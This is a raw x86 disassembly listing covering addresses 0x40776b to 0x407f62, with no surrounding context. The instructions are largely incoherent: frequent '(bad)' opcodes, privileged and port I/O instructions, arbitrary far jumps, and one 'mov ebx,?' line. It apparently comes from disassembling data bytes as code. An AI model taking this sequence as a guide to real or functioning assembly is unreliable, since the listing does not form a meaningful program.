  40776b:	pop    es
  40776c:	stos   DWORD PTR es:[edi],eax
  40776d:	sbb    eax,0xa2ffe656
  407772:	call   0xf8ae:0x92fe854e
  407779:	stos   BYTE PTR es:[edi],al
  40777a:	push   edi
  40777b:	push   es
  40777c:	icebp  
  40777d:	mov    eax,ds:0x75fcfee1
  407782:	or     edx,edx
  407784:	fucomp st(5)
  407786:	inc    edx
  407787:	mov    dh,0x8d
  407789:	jg     0x4077ec
  40778b:	and    ah,ah
  40778d:	add    cl,BYTE PTR [ecx+0x220032ff]
  407793:	inc    esi
  407794:	aad    0x3a
  407796:	call   0xbbd0:0xe9e26154
  40779d:	clc    
  40779e:	repz sub al,0x57
  4077a1:	fs xchg eax,ecx
  4077a4:	mov    ah,0x4e
  4077a6:	das    
  4077a7:	lods   eax,DWORD PTR ds:[esi]
  4077a8:	inc    esi
  4077a9:	lea    eax,[ecx-0x73]
  4077ac:	inc    esp
  4077ad:	pop    es
  4077ae:	aad    0xf3
  4077b0:	cmp    BYTE PTR [ebx+0x17],al
  4077b3:	adc    edi,DWORD PTR [eax+0x31]
  4077b6:	js     0x4077c4
  4077b8:	lds    edi,FWORD PTR [eax+0x5e905c69]
  4077be:	xchg   esi,eax
  4077bf:	xor    DWORD PTR [edx+ebp*2],ecx
  4077c2:	int3   
  4077c3:	lds    eax,FWORD PTR [edi-0x30]
  4077c6:	es std 
  4077c8:	mov    al,BYTE PTR [eax]
  4077ca:	mov    dl,0x36
  4077cc:	rol    BYTE PTR [ebp-0x7a],cl
  4077cf:	mov    eax,0x55c3d10c
  4077d4:	mov    ds:0xc1282a8,al
  4077d9:	cmp    DWORD PTR ds:0xd72fb102,ebx
  4077df:	loop   0x4077e3
  4077e1:	dec    eax
  4077e2:	jo     0x407844
  4077e4:	dec    eax
  4077e5:	mov    edi,0xa7d64310
  4077ea:	and    edx,DWORD PTR [eax]
  4077ec:	cmp    ebx,esi
  4077ee:	mov    ds:0x2bc1571c,al
  4077f3:	fnstcw WORD PTR [ebx]
  4077f5:	dec    ebp
  4077f6:	in     al,0x80
  4077f8:	adc    eax,0x15b25fe0
  4077fd:	jno    0x40787e
  4077ff:	push   es
  407800:	add    edi,ebp
  407802:	cmp    ebx,edi
  407804:	sub    ebx,DWORD PTR [edi-0x40]
  407807:	pop    ecx
  407808:	and    esi,ebx
  40780a:	and    ebp,0xa9d7a50e
  407810:	jo     0x4077f0
  407812:	sar    ah,1
  407814:	or     ah,dh
  407816:	jbe    0x4077ae
  407818:	loopne 0x407864
  40781a:	call   0x7b97:0x6ff404cd
  407821:	test   ebp,ebx
  407823:	pop    ds
  407824:	jae    0x4077a7
  407826:	mov    cl,0x1
  407828:	inc    esi
  407829:	jl     0x40782b
  40782b:	ret    0x3d87
  40782e:	stc    
  40782f:	test   al,ah
  407831:	icebp  
  407832:	and    BYTE PTR [ecx+0x8511671],bh
  407838:	mov    ebx,0x6d306776
  40783d:	enter  0x336d,0x11
  407841:	(bad)  
  407843:	fmul   QWORD PTR [eax+0x640d2365]
  407849:	add    DWORD PTR ds:0xcf8c6050,esi
  40784f:	das    
  407850:	push   ecx
  407851:	jae    0x4077e0
  407853:	and    DWORD PTR ds:0x3daea4da,ebx
  407859:	pop    edx
  40785a:	cmp    al,0xce
  40785c:	inc    ebp
  40785d:	and    eax,0xba7a6e56
  407862:	ds aad 0x90
  407865:	mov    bh,0xcc
  407867:	xor    edi,DWORD PTR [edx]
  407869:	out    dx,eax
  40786a:	sub    al,ch
  40786c:	add    esi,DWORD PTR [ebp+0x1c141262]
  407872:	xchg   esi,eax
  407873:	je     0x4078c3
  407875:	lds    eax,FWORD PTR ss:[edx]
  407878:	gs pushf 
  40787a:	dec    eax
  40787b:	(bad)  
  40787c:	retf   0x2394
  40787f:	jbe    0x407844
  407881:	test   DWORD PTR [esi],0x6e38eb52
  407887:	ja     0x407822
  407889:	and    al,0xc4
  40788b:	and    ch,BYTE PTR [ebx-0x68bb525a]
  407891:	jmp    0x138c:0xcc45a6cd
  407898:	mov    WORD PTR [edx],ds
  40789a:	pop    ebp
  40789b:	in     eax,0xf2
  40789d:	and    BYTE PTR [eax+0xa],ah
  4078a0:	dec    ecx
  4078a1:	pusha  
  4078a2:	test   eax,0xa5fc23e2
  4078a7:	aad    0xd
  4078a9:	push   edi
  4078aa:	jb     0x40788b
  4078ac:	pop    ebx
  4078ad:	inc    ecx
  4078ae:	pop    esi
  4078af:	test   al,0x7f
  4078b1:	jg     0x407880
  4078b3:	add    DWORD PTR [esi*4-0x1629568],edx
  4078ba:	test   al,0xd7
  4078bc:	aaa    
  4078bd:	jg     0x407899
  4078bf:	dec    eax
  4078c0:	call   0xb90d3fd3
  4078c5:	and    dl,BYTE PTR [edi]
  4078c7:	(bad)  [edi]
  4078c9:	(bad)  
  4078ca:	pop    esi
  4078cb:	imul   edi,DWORD PTR [ebx+edx*1-0x52b75361],0x34661df0
  4078d6:	pop    ebp
  4078d7:	sub    al,0x96
  4078d9:	in     al,0xff
  4078db:	mov    cl,0xc9
  4078dd:	sub    DWORD PTR [ebp+ecx*1-0x16],ebx
  4078e1:	cwde   
  4078e2:	loop   0x407920
  4078e4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4078e6:	inc    esp
  4078e7:	xchg   esi,eax
  4078e8:	inc    ebp
  4078e9:	inc    ecx
  4078ea:	xchg   edx,eax
  4078eb:	icebp  
  4078ec:	imul   ebp,esp,0x5c7cc8a1
  4078f2:	jno    0x40789b
  4078f4:	scas   eax,DWORD PTR es:[edi]
  4078f5:	sbb    edx,ebx
  4078f7:	adc    bl,0xc7
  4078fa:	and    edx,DWORD PTR [edi-0x15]
  4078fd:	add    esi,DWORD PTR [eax]
  4078ff:	or     BYTE PTR [ecx+0x71030918],cl
  407905:	cld    
  407906:	popf   
  407907:	stc    
  407908:	mov    al,0x18
  40790a:	mov    edx,0x86686dd8
  40790f:	jbe    0x407977
  407911:	cdq    
  407912:	scas   eax,DWORD PTR es:[edi]
  407913:	xor    al,0xbf
  407915:	cli    
  407916:	add    al,0x79
  407918:	add    DWORD PTR ss:[eax+0x4e],0xffffff81
  40791d:	inc    edx
  40791e:	add    eax,ebp
  407920:	mov    ebx,0x88b8e1f6
  407925:	in     eax,0x30
  407927:	call   DWORD PTR [esi-0x24]
  40792b:	js     0x407941
  40792d:	imul   BYTE PTR [ebp*2+0x605fee54]
  407934:	fistp  QWORD PTR [ebx+0x71]
  407937:	and    cl,BYTE PTR [edx+0x6a]
  40793a:	jmp    0x40790d
  40793c:	dec    eax
  40793d:	push   ecx
  40793e:	das    
  40793f:	jne    0x40795f
  407941:	inc    esi
  407942:	add    eax,0x8b5541a0
  407947:	cdq    
  407948:	jmp    0x480f:0x53fdeca0
  40794f:	xchg   esp,eax
  407950:	mov    esp,0xa258e7b0
  407955:	mov    bl,BYTE PTR [edi+0x50]
  407958:	stos   DWORD PTR es:[edi],eax
  407959:	sub    al,0x19
  40795b:	cmc    
  40795c:	pusha  
  40795d:	aam    0xa6
  40795f:	or     dl,ah
  407961:	pop    esi
  407962:	cmp    esi,ebp
  407964:	and    eax,0x325d583d
  407969:	mov    ds:0xb7e735fd,eax
  40796e:	push   cs
  40796f:	inc    esp
  407970:	jp     0x4079eb
  407972:	js     0x4079c9
  407974:	test   BYTE PTR [eax+edi*8+0xc],dh
  407978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407979:	jns    0x40794d
  40797b:	jmp    0x9300f425
  407980:	stos   BYTE PTR es:[edi],al
  407981:	aas    
  407982:	fisubr WORD PTR [eax]
  407984:	inc    ebp
  407985:	and    DWORD PTR [ebx-0x115b59ec],esp
  40798b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40798c:	cli    
  40798d:	popa   
  40798e:	push   cs
  40798f:	ins    BYTE PTR es:[edi],dx
  407990:	mov    ebp,0x416ad175
  407995:	out    0x7c,al
  407997:	push   cs
  407998:	test   dh,bh
  40799a:	jnp    0x4079c5
  40799c:	mov    ecx,0x838c267
  4079a1:	arpl   WORD PTR [edi],bp
  4079a3:	fiadd  DWORD PTR [esi-0x5f]
  4079a6:	or     ecx,DWORD PTR ds:0x195f12b
  4079ac:	sbb    eax,0x494ab640
  4079b1:	fadd   DWORD PTR [edx+eax*1+0x29297412]
  4079b8:	popa   
  4079b9:	lahf   
  4079ba:	rcl    bl,cl
  4079bc:	xor    DWORD PTR [edi],ebx
  4079be:	pop    ds
  4079bf:	xchg   ebx,eax
  4079c0:	cmp    al,0x49
  4079c2:	repnz or ebx,DWORD PTR [ecx]
  4079c5:	(bad)  
  4079c6:	das    
  4079c7:	xchg   edx,eax
  4079c8:	(bad)  
  4079c9:	(bad)  
  4079ca:	pusha  
  4079cb:	fwait
  4079cc:	push   esp
  4079cd:	rol    DWORD PTR [ecx+0x4b48e3e9],cl
  4079d3:	inc    edi
  4079d4:	or     bh,0xde
  4079d7:	push   ebx
  4079d8:	adc    al,0x6d
  4079da:	mov    dl,0x64
  4079dc:	in     eax,dx
  4079dd:	pop    edi
  4079de:	add    BYTE PTR [esi+0x1c],al
  4079e1:	into   
  4079e2:	inc    ebp
  4079e3:	aas    
  4079e4:	pop    ecx
  4079e5:	popa   
  4079e6:	jne    0x407990
  4079e8:	test   BYTE PTR [ebx+0x67d2e0af],bl
  4079ee:	out    dx,al
  4079ef:	and    BYTE PTR [ebp+0x7],al
  4079f2:	lds    ebx,FWORD PTR [edx+ecx*8-0x4a83e4d0]
  4079f9:	sub    al,BYTE PTR [edi-0x141f549e]
  4079ff:	mov    BYTE PTR [ebx+0x4d3e03a0],al
  407a05:	push   ecx
  407a06:	or     esi,ebp
  407a08:	xor    bh,ch
  407a0a:	xchg   edx,eax
  407a0b:	mov    ebp,fs
  407a0d:	or     ah,bh
  407a0f:	add    BYTE PTR [ebp-0x5354d10c],ah
  407a15:	sub    ebx,DWORD PTR ss:[ebp-0x10302b1d]
  407a1c:	or     edi,DWORD PTR [ecx+0x3b]
  407a1f:	add    edx,DWORD PTR [ebx+0x4a5a6272]
  407a25:	cmp    DWORD PTR [edx-0x7a],esp
  407a28:	stos   DWORD PTR es:[edi],eax
  407a29:	mov    ebp,0xd7c4f804
  407a2e:	out    0x6f,al
  407a30:	xor    DWORD PTR [ebp-0x4ef89b2e],esp
  407a36:	sbb    al,0x8
  407a38:	xchg   ebp,eax
  407a39:	push   0x33fba58
  407a3e:	inc    edi
  407a3f:	jb     0x407a3a
  407a41:	rcr    DWORD PTR [edi+0x23],0x9a
  407a45:	xchg   ebp,eax
  407a46:	cld    
  407a47:	loope  0x4079e4
  407a49:	jle    0x407a18
  407a4b:	in     eax,dx
  407a4c:	pop    ds
  407a4d:	lea    ecx,[ebx+edx*4+0x7c]
  407a51:	outs   dx,BYTE PTR ds:[esi]
  407a52:	int    0x3d
  407a54:	(bad)  
  407a55:	adc    esi,ecx
  407a57:	in     eax,0x34
  407a59:	shl    DWORD PTR [edx-0x36e59b65],0x23
  407a60:	xchg   BYTE PTR [ebx-0xe56bc18],cl
  407a66:	push   ebp
  407a67:	jle    0x407a8c
  407a69:	repnz sub al,0x5c
  407a6c:	push   ss
  407a6d:	popa   
  407a6e:	leave  
  407a6f:	jno    0x407ab9
  407a71:	inc    edx
  407a72:	sub    DWORD PTR [esi-0x68],ebx
  407a75:	jns    0x407a49
  407a77:	adc    dh,BYTE PTR gs:[ecx+0x69c33b4b]
  407a7e:	lock scas al,BYTE PTR es:[edi]
  407a80:	(bad)  
  407a81:	mov    DWORD PTR [edi+0x2e],edi
  407a84:	xchg   edi,eax
  407a85:	or     al,0x7f
  407a87:	jne    0x407acf
  407a89:	or     eax,0xda6589e3
  407a8e:	inc    ebx
  407a8f:	(bad)  
  407a90:	cli    
  407a91:	inc    esi
  407a92:	imul   ebx
  407a94:	pushf  
  407a95:	(bad)
  407a98:	es add al,0x5
  407a9b:	leave  
  407a9c:	call   FWORD PTR [edi]
  407a9e:	std    
  407a9f:	sub    BYTE PTR [edx+eax*4],0x92
  407aa3:	cdq    
  407aa4:	aaa    
  407aa5:	add    ebp,DWORD PTR [esi+ecx*8-0x18e7857c]
  407aac:	mov    cl,0x78
  407aae:	xchg   ebx,eax
  407aaf:	jns    0x407a96
  407ab1:	jge    0x407ab3
  407ab3:	call   0x60084776
  407ab8:	shr    DWORD PTR [eax+0x6dd7625e],1
  407abe:	(bad)  
  407ac1:	addr16 jmp 0x6e3a:0x3f2e4b72
  407ac9:	jnp    0x407a8e
  407acb:	pop    es
  407acc:	or     BYTE PTR [esi+0x5],ch
  407acf:	aad    0xe5
  407ad1:	mov    dh,0x6c
  407ad3:	push   ss
  407ad4:	add    ah,al
  407ad6:	dec    edx
  407ad7:	out    dx,eax
  407ad8:	mov    bl,ah
  407ada:	(bad)  
  407adb:	mov    bh,0x9c
  407add:	mov    ebx,0x7455a808
  407ae2:	sub    al,0x67
  407ae4:	sbb    al,0x62
  407ae6:	cmp    esi,DWORD PTR [ebx+0x2ccf84b9]
  407aec:	test   BYTE PTR [edi+0x755a6341],cl
  407af2:	ds jmp 0xd7c4:0x21e63927
  407afa:	rcl    DWORD PTR [ecx-0x2e66ca5f],0xe2
  407b01:	mov    DWORD PTR [eax+edi*1+0x3f],edi
  407b05:	inc    esp
  407b06:	inc    edi
  407b07:	(bad)  
  407b08:	(bad)  
  407b09:	jmp    0xf13e6838
  407b0e:	fwait
  407b0f:	(bad)  
  407b10:	pop    ds
  407b11:	out    dx,al
  407b12:	jb     0x407b60
  407b14:	js     0x407a9d
  407b16:	hlt    
  407b17:	sbb    DWORD PTR [ecx+0x52060f5],eax
  407b1d:	out    0xfc,al
  407b1f:	adc    BYTE PTR [ecx-0x615ddd03],dl
  407b25:	jo     0x407b0b
  407b27:	js     0x407b8f
  407b29:	or     ch,bl
  407b2b:	jno    0x407b7c
  407b2d:	fsubr  QWORD PTR [ecx+0x2e44960e]
  407b33:	mov    esp,DWORD PTR ds:0xb6aa5e0e
  407b39:	cmc    
  407b3a:	jbe    0x407af4
  407b3c:	adc    edi,esi
  407b3e:	mov    eax,ds:0x66cae822
  407b43:	xor    al,0xb
  407b45:	aad    0x31
  407b47:	xchg   BYTE PTR [edi+0x6e],al
  407b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b4b:	mov    ebx,DWORD PTR [esi+0x73]
  407b4e:	pop    es
  407b4f:	jecxz  0x407b65
  407b51:	not    DWORD PTR [ebp+0x4bc6e742]
  407b57:	push   ds
  407b58:	cmp    BYTE PTR [ebx],ah
  407b5a:	outs   dx,BYTE PTR ds:[esi]
  407b5b:	or     BYTE PTR [ebp-0x603595fc],0x1b
  407b62:	inc    edx
  407b63:	lds    ebx,FWORD PTR [edx-0x26b65087]
  407b69:	inc    ebp
  407b6a:	mov    ds:0xe56081cc,eax
  407b6f:	leave  
  407b70:	push   esp
  407b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b72:	xchg   edx,eax
  407b73:	xor    BYTE PTR [edx-0x67],dl
  407b76:	add    al,0x59
  407b78:	inc    edx
  407b79:	dec    ebp
  407b7a:	fstp   DWORD PTR [eax]
  407b7c:	repz mov ah,0xc4
  407b80:	xchg   ebp,eax
  407b81:	sbb    DWORD PTR [edi-0x65a76423],0xffffff8d
  407b88:	aam    0x7
  407b8a:	loopne 0x407b76
  407b8c:	mov    edx,0xc734bd90
  407b91:	mov    esi,0xeec271ac
  407b96:	inc    edx
  407b97:	push   ecx
  407b98:	add    al,0xf7
  407b9a:	rol    BYTE PTR [eax],1
  407b9c:	mov    edi,0x555d170f
  407ba1:	jo     0x407b26
  407ba3:	outs   dx,DWORD PTR ds:[esi]
  407ba4:	sub    dl,ah
  407ba6:	mov    ds:0x59da5dc,eax
  407bab:	or     DWORD PTR [esi-0x59374c88],ebx
  407bb1:	shr    BYTE PTR [esi-0x58],cl
  407bb4:	imul   ecx,DWORD PTR [eax+0x8893233],0xd95b3980
  407bbe:	rcr    BYTE PTR [ebx+eax*8],1
  407bc1:	mov    cl,0x7f
  407bc3:	mov    edi,0x5d4db122
  407bc8:	push   ss
  407bc9:	aaa    
  407bca:	inc    ebp
  407bcb:	not    ebp
  407bcd:	popf   
  407bce:	pop    eax
  407bcf:	aad    0xd
  407bd1:	inc    edi
  407bd2:	loope  0x407c39
  407bd4:	add    edi,DWORD PTR [edx]
  407bd6:	call   0x5686ba79
  407bdb:	std    
  407bdc:	cli    
  407bdd:	xchg   ebp,eax
  407bde:	sbb    bh,bl
  407be0:	add    DWORD PTR [ecx],0xffffffa3
  407be3:	mov    cl,0xae
  407be5:	ins    BYTE PTR es:[edi],dx
  407be6:	js     0x407ba0
  407be8:	pop    edx
  407be9:	inc    esi
  407bea:	sbb    ecx,0xffffffd5
  407bed:	jne    0x407c37
  407bef:	xchg   ebx,eax
  407bf0:	cmp    BYTE PTR [ebx-0x6a],dh
  407bf3:	icebp  
  407bf4:	sbb    eax,0xda6400aa
  407bf9:	gs xchg ebx,eax
  407bfb:	mov    esp,0x5e394398
  407c00:	mov    ebx,0xc6d0f44d
  407c05:	mov    ch,0x8c
  407c07:	jo     0x407c09
  407c09:	aam    0x73
  407c0b:	repnz or ah,BYTE PTR [edi+0xa]
  407c0f:	out    0x13,eax
  407c11:	cmp    BYTE PTR [edx],bl
  407c13:	std    
  407c14:	xchg   edx,eax
  407c15:	sbb    DWORD PTR [ecx-0x6c7fefda],eax
  407c1b:	push   ss
  407c1c:	leave  
  407c1d:	nop
  407c1e:	aas    
  407c1f:	jmp    0x15a7367b
  407c24:	out    dx,eax
  407c25:	rcl    DWORD PTR [esi+0x2a],0xfd
  407c29:	sbb    eax,0x5588d936
  407c2e:	add    eax,0xa27c97eb
  407c33:	pushf  
  407c34:	in     eax,dx
  407c35:	mov    ds:0xbfc81fa4,al
  407c3a:	dec    ebx
  407c3b:	int3   
  407c3c:	mov    cl,0xc1
  407c3e:	xchg   BYTE PTR [edx-0x63],ch
  407c41:	xor    al,0xf
  407c43:	adc    bh,BYTE PTR [ebx]
  407c45:	neg    ah
  407c47:	pop    esi
  407c48:	mov    DWORD PTR ds:0xbd382dd8,0x1fd8d8cb
  407c52:	in     eax,0xfb
  407c54:	inc    ecx
  407c55:	aad    0xd7
  407c57:	daa    
  407c58:	xchg   esi,eax
  407c59:	into   
  407c5a:	pop    esp
  407c5b:	adc    edx,DWORD PTR [ebx+0x72]
  407c5e:	aas    
  407c5f:	ss shr dl,0xe1
  407c63:	imul   DWORD PTR [esi]
  407c65:	ficomp DWORD PTR [ebx]
  407c67:	and    eax,0x9e4e4642
  407c6c:	fst    DWORD PTR [edi+0x28]
  407c6f:	add    eax,0x107fc149
  407c74:	neg    esi
  407c76:	stos   DWORD PTR es:[edi],eax
  407c77:	jne    0x407cbd
  407c79:	in     al,0xc6
  407c7b:	fmul   st(6),st
  407c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c7f:	and    DWORD PTR [eax],ebp
  407c81:	sub    DWORD PTR [ecx-0x26],ecx
  407c84:	add    cl,ch
  407c86:	dec    ebx
  407c87:	repz mov al,BYTE PTR [eax-0x290d3098]
  407c8e:	nop
  407c8f:	mov    ah,0xd5
  407c91:	inc    ebx
  407c92:	xor    DWORD PTR [ebx+esi*8-0x7ed9c0c6],eax
  407c99:	mov    edi,DWORD PTR [ecx]
  407c9b:	cmc    
  407c9c:	push   0x75418f70
  407ca1:	xor    esi,ecx
  407ca3:	push   esp
  407ca4:	popa   
  407ca5:	mov    al,ds:0xd6dfa2ce
  407caa:	(bad)  
  407cab:	mov    ah,0x30
  407cad:	int    0x94
  407caf:	jnp    0x407c54
  407cb1:	int    0xda
  407cb3:	jg     0x407c7a
  407cb5:	pop    edi
  407cb6:	or     BYTE PTR ds:[eax-0x67256a11],0xa4
  407cbe:	xor    edi,DWORD PTR [ecx]
  407cc0:	imul   ecx,ecx,0x99a8863c
  407cc6:	push   0x21
  407cc8:	push   ss
  407cc9:	out    dx,al
  407cca:	in     eax,dx
  407ccb:	or     al,0x8f
  407ccd:	push   ecx
  407cce:	stos   BYTE PTR es:[edi],al
  407ccf:	daa    
  407cd0:	popa   
  407cd1:	jnp    0x407ca7
  407cd3:	adc    DWORD PTR [edi+0x56ecbc4e],edx
  407cd9:	fldcw  WORD PTR [ecx]
  407cdb:	pop    ds
  407cdc:	loope  0x407cc8
  407cde:	pop    eax
  407cdf:	jae    0x407d1d
  407ce1:	mov    fs:0xe4848786,al
  407ce7:	iret   
  407ce8:	push   esi
  407ce9:	cdq    
  407cea:	mov    eax,ds:0xca3ba703
  407cef:	push   edi
  407cf0:	dec    esp
  407cf1:	fild   QWORD PTR ds:0x642a6ab6
  407cf7:	pop    edi
  407cf8:	jmp    0x407cac
  407cfa:	sbb    DWORD PTR [esi+0x36],ecx
  407cfd:	xchg   ecx,eax
  407cfe:	xchg   DWORD PTR [eax-0x73c0004c],ebx
  407d04:	iret   
  407d05:	jmp    0x6906:0x5d1ef760
  407d0c:	push   ds
  407d0d:	push   ebp
  407d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d0f:	out    0xe,eax
  407d11:	push   cs
  407d12:	je     0x407d2f
  407d14:	xlat   BYTE PTR ds:[ebx]
  407d15:	addr16 std 
  407d17:	bound  esi,QWORD PTR [esi+0x60]
  407d1a:	inc    esp
  407d1b:	push   ebp
  407d1c:	das    
  407d1d:	out    0x8,al
  407d1f:	cmp    al,BYTE PTR [ebx-0x76]
  407d22:	sbb    cl,dl
  407d24:	out    dx,eax
  407d25:	mov    DWORD PTR [edx],ebp
  407d27:	(bad)  [esp+edi*1-0x6e]
  407d2b:	jge    0x407d21
  407d2d:	jae    0x407ccd
  407d2f:	outs   dx,BYTE PTR ds:[esi]
  407d30:	dec    eax
  407d31:	jno    0x407d9c
  407d33:	xchg   esp,eax
  407d34:	and    dl,0xcf
  407d37:	test   DWORD PTR [edi-0x5c5e45f3],ecx
  407d3d:	or     eax,0x8389eb23
  407d42:	js     0x407d74
  407d44:	pop    ss
  407d45:	and    al,0xf9
  407d47:	xchg   edi,eax
  407d48:	hlt    
  407d49:	ret    0xa987
  407d4c:	shl    BYTE PTR [ebx+esi*8+0x74],0x29
  407d51:	xor    DWORD PTR ds:0xaad3620b,eax
  407d57:	pop    esp
  407d58:	les    edx,FWORD PTR [edi-0x55cfbab0]
  407d5e:	mov    bh,0x42
  407d60:	or     bh,BYTE PTR [esp+ebp*4+0x796725f8]
  407d67:	mov    ecx,0xed22c2a0
  407d6c:	sbb    ah,BYTE PTR [ebp+0xb1cc454]
  407d72:	retf   0x8436
  407d75:	inc    ebp
  407d76:	shl    BYTE PTR gs:0xac1b88ed,1
  407d7d:	and    al,0x9e
  407d7f:	clc    
  407d80:	mul    DWORD PTR [ebx]
  407d82:	or     eax,0x55d9331
  407d87:	cmp    DWORD PTR ds:0x1f65dda2,0x9cc09833
  407d91:	out    dx,al
  407d92:	sti    
  407d93:	dec    eax
  407d94:	add    DWORD PTR [edi+0x78eb6d83],ecx
  407d9a:	lods   al,BYTE PTR ds:[esi]
  407d9b:	lea    edx,[esi-0x5c32db3]
  407da1:	add    al,bh
  407da3:	jmp    0x407ddb
  407da5:	fiadd  WORD PTR gs:[ecx-0x79]
  407da9:	sti    
  407daa:	xchg   BYTE PTR [esi],bl
  407dac:	sub    al,0x0
  407dae:	fstp   QWORD PTR [ebx]
  407db0:	adc    eax,0x843cc043
  407db5:	pop    ds
  407db6:	pushf  
  407db7:	jns    0x407e11
  407db9:	mov    cl,0xa7
  407dbb:	aaa    
  407dbc:	pop    edi
  407dbd:	data16 repnz xor dl,BYTE PTR [edx+eax*1+0x79]
  407dc3:	xor    ah,bh
  407dc5:	cld    
  407dc6:	mov    eax,0xa85b6f7c
  407dcb:	call   0x73a8:0xce4e2881
  407dd2:	mov    DWORD PTR [esp+edi*4],0xf899c58c
  407dd9:	(bad)  
  407dda:	loop   0x407da5
  407ddc:	pop    ebx
  407ddd:	or     ch,ah
  407ddf:	cld    
  407de0:	loope  0x407e4d
  407de2:	push   cs
  407de3:	pop    edx
  407de4:	cli    
  407de5:	xlat   BYTE PTR ds:[ebx]
  407de6:	mov    cl,0x75
  407de8:	inc    ecx
  407de9:	imul   DWORD PTR [ecx]
  407deb:	sbb    eax,0xa09fc79a
  407df0:	aaa    
  407df1:	inc    edi
  407df2:	aaa    
  407df3:	push   esi
  407df4:	mov    ebp,DWORD PTR gs:[ebp-0x31]
  407df8:	mov    ebx,?
  407dfa:	ret    
  407dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dfc:	add    ebx,DWORD PTR ds:0x29398de
  407e02:	repz shl DWORD PTR [ebx-0x1dede273],0x54
  407e0a:	mov    edx,0xe0daf9f1
  407e0f:	add    DWORD PTR [ecx-0x71],esp
  407e12:	sbb    dh,BYTE PTR [ebx-0x2a75d3b5]
  407e18:	dec    esp
  407e19:	hlt    
  407e1a:	xor    al,0x48
  407e1c:	scas   eax,DWORD PTR es:[edi]
  407e1d:	and    cl,BYTE PTR [ecx+ecx*8]
  407e20:	inc    eax
  407e21:	adc    eax,0x5e3e59fe
  407e26:	ds jecxz 0x407db3
  407e29:	xor    al,0xba
  407e2b:	xchg   esp,eax
  407e2c:	iret   
  407e2d:	or     eax,0xab346c6b
  407e32:	ret    0xa899
  407e35:	pop    edx
  407e36:	push   ecx
  407e37:	inc    ecx
  407e38:	idiv   DWORD PTR [esi-0x503a853d]
  407e3e:	dec    ebx
  407e3f:	aam    0x34
  407e41:	xor    esi,0x98667611
  407e47:	idiv   DWORD PTR [ecx+0xfd7f611]
  407e4d:	mov    cl,0xc
  407e4f:	jmp    0x5e6c:0xbe732bbe
  407e56:	push   ecx
  407e57:	jae    0x407e7e
  407e59:	inc    ebp
  407e5a:	inc    edx
  407e5b:	sbb    DWORD PTR [ebx+0x7dcde191],esp
  407e61:	push   edx
  407e62:	dec    esi
  407e63:	mov    esi,0x2aa5bab8
  407e68:	mov    bh,0xbc
  407e6a:	and    BYTE PTR [edi],bh
  407e6c:	stos   BYTE PTR es:[edi],al
  407e6d:	xchg   ebx,eax
  407e6e:	cmp    eax,0xa13a5f48
  407e73:	test   eax,0xe70bf7
  407e78:	mov    ds:0xb1d6832a,al
  407e7d:	out    dx,eax
  407e7e:	jb     0x407ee7
  407e80:	xchg   BYTE PTR [ecx+0x7059bb77],ah
  407e86:	icebp  
  407e87:	and    ebx,DWORD PTR [esi+0x74192280]
  407e8d:	mov    edx,0xaa836f86
  407e92:	push   esp
  407e93:	loope  0x407eda
  407e95:	sbb    BYTE PTR [ecx+0x24780320],0x86
  407e9c:	std    
  407e9d:	sar    ah,cl
  407e9f:	push   ds
  407ea0:	mov    esi,0x76c7eede
  407ea5:	jge    0x407eb3
  407ea7:	pop    es
  407ea8:	or     DWORD PTR [ebp+0x881e479],0xe95959c3
  407eb2:	xor    bl,0xd7
  407eb5:	aam    0xce
  407eb7:	and    dh,BYTE PTR [ebx]
  407eb9:	add    bh,BYTE PTR [edi+0x7628d13]
  407ebf:	aam    0x61
  407ec1:	ss or  ecx,eax
  407ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec5:	(bad)  
  407ec6:	and    eax,0x88efa29c
  407ecb:	sbb    BYTE PTR [esi-0x6978b262],dl
  407ed1:	jp     0x407e94
  407ed3:	ins    DWORD PTR es:[edi],dx
  407ed4:	jmp    0x407e67
  407ed6:	(bad)  
  407ed7:	jecxz  0x407e80
  407ed9:	or     al,dh
  407edb:	stc    
  407edc:	aaa    
  407edd:	push   ebx
  407ede:	pop    ecx
  407edf:	nop
  407ee0:	pop    eax
  407ee1:	xor    BYTE PTR [ecx-0x3f403a04],0xa8
  407ee8:	jmp    0x94a6:0x9881da08
  407eef:	test   DWORD PTR [edx+0x161a664c],esp
  407ef5:	stos   DWORD PTR es:[edi],eax
  407ef6:	js     0x407f30
  407ef8:	jmp    edi
  407efa:	out    dx,al
  407efb:	lock pop ss
  407efd:	xchg   ebx,eax
  407efe:	and    DWORD PTR [edx-0x37325542],0xffffffdf
  407f05:	cli    
  407f06:	inc    edx
  407f07:	(bad)  
  407f08:	cwde   
  407f09:	rcl    DWORD PTR [esi+0x1651852e],cl
  407f0f:	ffreep st(0)
  407f11:	inc    ebp
  407f12:	inc    edx
  407f13:	inc    esi
  407f14:	jge    0x407f92
  407f16:	cdq    
  407f17:	or     dl,BYTE PTR [ebp-0x53cc5735]
  407f1d:	mov    bh,0xa4
  407f1f:	xchg   ecx,eax
  407f20:	test   al,0x22
  407f22:	lods   eax,DWORD PTR ds:[esi]
  407f23:	dec    esi
  407f24:	fisttp QWORD PTR [ebx+0x12]
  407f27:	sar    al,1
  407f29:	cwde   
  407f2a:	sbb    al,0xb5
  407f2c:	test   eax,0xf4a3b727
  407f31:	add    BYTE PTR [ecx+0x2592dbb9],ch
  407f37:	not    BYTE PTR [ebx]
  407f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f3a:	xchg   DWORD PTR [esi+0x69],ecx
  407f3d:	rcr    BYTE PTR [eax+0x41],0x69
  407f41:	test   eax,0x83306805
  407f46:	aam    0x8
  407f48:	pop    ds
  407f49:	cld    
  407f4a:	ins    DWORD PTR es:[edi],dx
  407f4b:	pop    edi
  407f4c:	mov    al,0xc6
  407f4e:	push   ss
  407f4f:	cmp    DWORD PTR [esi+0x2ed8528b],edi
  407f55:	add    BYTE PTR [edx],cl
  407f57:	pop    edx
  407f58:	sub    BYTE PTR [edi+0x478c2638],0xff
  407f5f:	addr16 jae 0x407efd
  407f62:	ja     0x407f07
